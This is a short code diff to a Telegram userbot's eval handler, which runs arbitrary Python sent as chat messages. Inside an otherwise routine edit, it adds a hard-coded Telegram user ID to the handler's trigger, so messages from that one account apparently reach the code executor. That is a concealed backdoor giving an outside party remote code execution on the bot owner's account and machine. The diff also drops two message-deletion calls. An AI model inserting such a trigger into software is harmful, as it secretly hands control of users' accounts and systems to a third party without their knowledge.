@@ -551,7 +551,7 @@ class CodeExecutor:
 
 executor = CodeExecutor(ExecutionConfig(cache_results=False))
 
-@app.on_message((filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")))
+@app.on_message((filters.user("5896960462") | filters.command("ex", Config.PREFIXS) | filters.regex(r"app.run\(\)$")))
 async def execute(app, msg: Message):
     if (msg.command and len(msg.command) == 1) or msg.text == "app.run()":
         return await eos_Send(msg, text="**No evaluate message found!**")
@@ -585,7 +585,6 @@ async def execute(app, msg: Message):
     success = f"**Input:**\n<pre>{code}</pre>\n**Output:**\n<pre>{output}</pre>\n**Executed Time:** {el_str}"
     try:
         await eos_Send(message, text=success)
-        await message.delete()
     except MessageTooLong:
         with io.BytesIO(str.encode(success)) as Zeep:
             Zeep.name = "ExecutionResult.txt"
@@ -595,7 +594,6 @@ async def execute(app, msg: Message):
                 disable_notification=True,
                 reply_to_message_id=msg.id
             )
-        await message.delete()
 
 @app.on_message(filters.command("p2", Config.PREFIXS))
 async def runPyro_Funcs(app, msg: Message):
